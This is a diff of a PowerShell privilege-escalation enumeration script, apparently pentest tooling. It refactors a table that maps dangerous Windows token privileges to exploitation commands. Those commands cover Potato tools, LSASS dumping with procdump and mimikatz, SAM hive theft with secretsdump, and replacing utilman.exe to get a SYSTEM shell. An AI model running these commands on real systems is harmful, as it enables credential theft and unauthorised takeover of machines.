@@ -251,30 +251,20 @@ whoami /groups /fo csv 2>$null | ConvertFrom-Csv | %{
 # ════════════════════════════════════════════════════════════════
 
 if (-not $Admin) {
+
 hdr "§0.5 - TOKEN PRIVILEGES (whoami /priv)"
 
-$dangerousPrivs = @{
-    'SeImpersonatePrivilege'        = @{ S='CRIT'; D='Potato attacks -> SYSTEM'
-        E="PrintSpoofer.exe -i -c cmd`nGodPotato.exe -cmd `"cmd /c whoami`"`nJuicyPotato.exe -l 1337 -p cmd.exe -t *`nSweetPotato.exe -e EfsRpc -p cmd.exe" }
-    'SeAssignPrimaryTokenPrivilege' = @{ S='CRIT'; D='Token assignment - same as SeImpersonate'
-        E="JuicyPotato.exe -l 1337 -p cmd.exe -t *`nGodPotato.exe -cmd `"cmd /c whoami`"" }
-    'SeDebugPrivilege'              = @{ S='CRIT'; D='Debug any process - dump LSASS for creds'
-        E="procdump.exe -accepteula -ma lsass.exe lsass.dmp`nThen on attacker: mimikatz # sekurlsa::minidump lsass.dmp`nmimikatz # sekurlsa::logonpasswords" }
-    'SeBackupPrivilege'             = @{ S='HIGH'; D='Read any file regardless of ACL'
-        E="reg save HKLM\SAM sam.bak`nreg save HKLM\SYSTEM sys.bak`nsecretsdump.py -sam sam.bak -system sys.bak LOCAL`nOr: robocopy /b to copy any file" }
-    'SeRestorePrivilege'            = @{ S='HIGH'; D='Write any file - overwrite system binaries'
-        E="Replace utilman.exe with cmd.exe:`ncopy cmd.exe C:\Windows\System32\utilman.exe`nLock screen -> click Ease of Access -> SYSTEM shell" }
-    'SeTakeOwnershipPrivilege'      = @{ S='HIGH'; D='Take ownership of any object'
-        E="takeown /f C:\Windows\System32\config\SAM`nicacls C:\Windows\System32\config\SAM /grant $($myName):F`nThen dump SAM hashes" }
-    'SeLoadDriverPrivilege'         = @{ S='HIGH'; D='Load kernel drivers - Capcom.sys exploit'
-        E="1. Load vulnerable Capcom.sys driver`n2. ExploitCapcom.exe to get SYSTEM shell" }
-    'SeCreateTokenPrivilege'        = @{ S='HIGH'; D='Create arbitrary tokens with any privilege'
-        E="Craft token with admin privileges using NtCreateToken" }
-    'SeTcbPrivilege'                = @{ S='CRIT'; D='Act as OS - create tokens for any user'
-        E="Create token for any user including SYSTEM" }
-    'SeManageVolumePrivilege'       = @{ S='HIGH'; D='Manage volumes - write to system32'
-        E="SeManageVolumeExploit.exe`nThen place DLL in system32 for hijack" }
-}
+$dangerousPrivs = New-Object Collections.Hashtable
+$dangerousPrivs['SeImpersonatePrivilege']        = @{ S='CRIT'; D='Potato attacks -> SYSTEM';        E="PrintSpoofer.exe -i -c cmd`nGodPotato.exe -cmd `"cmd /c whoami`"`nJuicyPotato.exe -l 1337 -p cmd.exe -t *`nSweetPotato.exe -e EfsRpc -p cmd.exe" }
+$dangerousPrivs['SeAssignPrimaryTokenPrivilege'] = @{ S='CRIT'; D='Token assignment - same as SeImpersonate'; E="JuicyPotato.exe -l 1337 -p cmd.exe -t *`nGodPotato.exe -cmd `"cmd /c whoami`"" }
+$dangerousPrivs['SeDebugPrivilege']              = @{ S='CRIT'; D='Debug any process - dump LSASS for creds'; E="procdump.exe -accepteula -ma lsass.exe lsass.dmp`nThen on attacker: mimikatz # sekurlsa::minidump lsass.dmp`nmimikatz # sekurlsa::logonpasswords" }
+$dangerousPrivs['SeBackupPrivilege']             = @{ S='HIGH'; D='Read any file regardless of ACL'; E="reg save HKLM\SAM sam.bak`nreg save HKLM\SYSTEM sys.bak`nsecretsdump.py -sam sam.bak -system sys.bak LOCAL`nOr: robocopy /b to copy any file" }
+$dangerousPrivs['SeRestorePrivilege']            = @{ S='HIGH'; D='Write any file - overwrite system binaries'; E="Replace utilman.exe with cmd.exe:`ncopy cmd.exe C:\Windows\System32\utilman.exe`nLock screen -> click Ease of Access -> SYSTEM shell" }
+$dangerousPrivs['SeTakeOwnershipPrivilege']      = @{ S='HIGH'; D='Take ownership of any object'; E="takeown /f C:\Windows\System32\config\SAM`nicacls C:\Windows\System32\config\SAM /grant $($myName):F`nThen dump SAM hashes" }
+$dangerousPrivs['SeLoadDriverPrivilege']         = @{ S='HIGH'; D='Load kernel drivers - Capcom.sys exploit'; E="1. Load vulnerable Capcom.sys driver`n2. ExploitCapcom.exe to get SYSTEM shell" }
+$dangerousPrivs['SeCreateTokenPrivilege']        = @{ S='HIGH'; D='Create arbitrary tokens with any privilege'; E="Craft token with admin privileges using NtCreateToken" }
+$dangerousPrivs['SeTcbPrivilege']                = @{ S='CRIT'; D='Act as OS - create tokens for any user'; E="Create token for any user including SYSTEM" }
+$dangerousPrivs['SeManageVolumePrivilege']       = @{ S='HIGH'; D='Manage volumes - write to system32'; E="SeManageVolumeExploit.exe`nThen place DLL in system32 for hijack" }
 
 $privLines = whoami /priv 2>$null
 if ($privLines) {
